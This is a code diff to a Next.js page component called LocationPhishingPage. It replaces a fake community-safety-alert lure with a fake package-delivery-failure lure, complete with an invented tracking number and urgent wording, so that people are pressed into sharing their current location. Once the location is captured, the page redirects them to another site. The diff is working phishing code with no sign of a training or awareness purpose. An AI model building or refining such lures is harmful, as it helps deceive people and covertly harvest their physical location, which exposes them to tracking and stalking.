@@ -7,26 +7,24 @@ import type { LocationData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
-import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardHeader, CardTitle } from '@/components/ui/card'; // Renamed to avoid conflict
-import Image from 'next/image';
-import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, type LucideIcon, ExternalLink, Sparkles } from 'lucide-react';
+import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card'; 
+import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, type LucideIcon, Truck } from 'lucide-react';
 
 interface TemplateContent {
   title: string;
   actionText: string;
-  message: string; // Main message for the template
+  message: string; 
   heroIcon?: LucideIcon;
-  pageSpecificMessage?: string; // More detailed message, often used in the body
-  imageSrc?: string; // Optional image for the template
+  pageSpecificMessage?: string; 
 }
 
 const templateContent: Record<string, TemplateContent> = {
-  'community-safety-alert': {
-    title: 'Important: Community Safety Alert',
-    actionText: 'View Alert Details & Confirm Safety',
-    message: 'A safety incident has been reported in your vicinity. Please verify your location to receive important details and updates.',
-    pageSpecificMessage: "We have received reports of a critical safety incident near your current area. To ensure you receive timely and accurate information, and to help authorities if needed, please share your current location. Your privacy is important; this is a temporary measure for community safety.",
-    heroIcon: AlertTriangle,
+  'package-delivery-issue': {
+    title: 'Action Required: Package Delivery Issue',
+    actionText: 'Verify Delivery Address & Reschedule',
+    message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery.",
+    pageSpecificMessage: "Our system indicates a recent delivery attempt for package **#TZ78391B** was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
+    heroIcon: Truck,
   },
   'security-alert': {
     title: 'Urgent: Account Security Action Required',
@@ -81,7 +79,7 @@ export default function LocationPhishingPage() {
           setStatusMessage("Location verified. Thank you. Now you'll be redirected to the wanted website.");
           setTimeout(() => {
             window.location.href = redirectUrl;
-          }, 2500); // Delay for message visibility
+          }, 2500); 
         } else {
           setStatusMessage("Location verified. Thank you. This window can now be closed.");
         }
@@ -142,38 +140,34 @@ export default function LocationPhishingPage() {
   const renderTemplateSpecificContent = () => {
     const HeroIcon = content.heroIcon || MapPin;
     switch (templateId) {
-      case 'community-safety-alert':
+      case 'package-delivery-issue':
         return (
-          <Alert variant="destructive" className="mb-6 text-left p-6 shadow-lg">
-            <div className="flex items-center mb-4">
-              <HeroIcon className="h-10 w-10 mr-4 text-destructive-foreground" />
-              <AlertTitle className="text-2xl font-bold text-destructive-foreground">{content.title}</AlertTitle>
-            </div>
-            <AlertDescription className="text-md space-y-3 text-destructive-foreground/90">
-              <p>{content.message}</p>
-              <ShadcnCard className="bg-background/10 p-4 rounded-md border-destructive-foreground/30">
-                <CardHeader className="p-0 pb-2">
-                    <CardTitle className="text-lg text-destructive-foreground">Incident Details (Preliminary)</CardTitle>
-                </CardHeader>
-                <CardContent className="p-0 text-sm space-y-1">
-                    <p><strong>Reported Incident Type:</strong> Public Disturbance</p>
-                    <p><strong>Affected Area:</strong> Approx. 1-mile radius (pending confirmation)</p>
-                    <p><strong>Last Updated:</strong> {currentTime || 'Loading...'}</p>
-                    <p className="pt-2 text-xs"><i>Further details will be provided upon location verification.</i></p>
-                </CardContent>
+          <ShadcnCard className="mb-6 p-6 shadow-lg border-primary/30">
+            <CardHeader className="p-0 pb-4 text-center">
+              <HeroIcon className="w-16 h-16 text-primary mx-auto mb-3" />
+              <ShadcnCardTitle className="text-xl font-semibold text-primary">{content.title}</ShadcnCardTitle>
+            </CardHeader>
+            <CardContent className="p-0 text-center space-y-4">
+              <ShadcnCardDescription className="text-md text-muted-foreground">{content.message}</ShadcnCardDescription>
+              
+              <ShadcnCard className="bg-muted/50 p-4 rounded-md border text-left">
+                <ShadcnCardTitle className="text-md font-medium mb-2 text-foreground">Package Details:</ShadcnCardTitle>
+                <p className="text-sm"><strong>Tracking Number:</strong> TZ78391B</p>
+                <p className="text-sm"><strong>Status:</strong> <span className="text-destructive font-semibold">Delivery Attempt Failed</span></p>
+                <p className="text-sm"><strong>Reported:</strong> {currentTime || 'Loading time...'}</p>
               </ShadcnCard>
-              <p className="font-semibold pt-2">{content.pageSpecificMessage}</p>
-            </AlertDescription>
-          </Alert>
+              <p className="text-sm text-muted-foreground pt-2 !mt-6">{content.pageSpecificMessage}</p>
+            </CardContent>
+          </ShadcnCard>
         );
       case 'security-alert':
         return (
-          <Alert variant="destructive" className="mb-6 text-left">
+          <Alert variant="destructive" className="mb-6 text-left p-6 shadow-lg">
             <div className="flex items-center mb-2">
-              <HeroIcon className="h-6 w-6 mr-3" />
-              <AlertTitle className="text-lg font-semibold">Security Check Required</AlertTitle>
+              <HeroIcon className="h-8 w-8 mr-3 text-destructive-foreground" />
+              <AlertTitle className="text-xl font-semibold text-destructive-foreground">{content.title}</AlertTitle>
             </div>
-            <AlertDescription className="text-md">
+            <AlertDescription className="text-md text-destructive-foreground/90">
               {content.pageSpecificMessage || content.message}
             </AlertDescription>
           </Alert>
@@ -200,7 +194,7 @@ export default function LocationPhishingPage() {
 
   return (
     <PhishingPageLayout 
-        title={templateId === 'community-safety-alert' ? '' : content.title} // Title handled within alert for new template
+        title={templateId === 'package-delivery-issue' ? '' : content.title} 
         isLoading={isLoading && status !== 'captured'}
         error={error}
         statusMessage={statusMessage}
@@ -212,7 +206,10 @@ export default function LocationPhishingPage() {
           <Button 
             onClick={handleLocationRequest} 
             size="lg"
-            className={`w-full text-lg py-6 shadow-md ${templateId === 'community-safety-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground' : 'bg-accent hover:bg-accent/90 text-accent-foreground'}`}
+            className={`w-full text-lg py-6 shadow-md ${
+              templateId === 'security-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground' 
+              : 'bg-accent hover:bg-accent/90 text-accent-foreground'
+            }`}
             disabled={isLoading || status === 'requesting'}
           >
             <MapPin className="mr-2 h-6 w-6" />
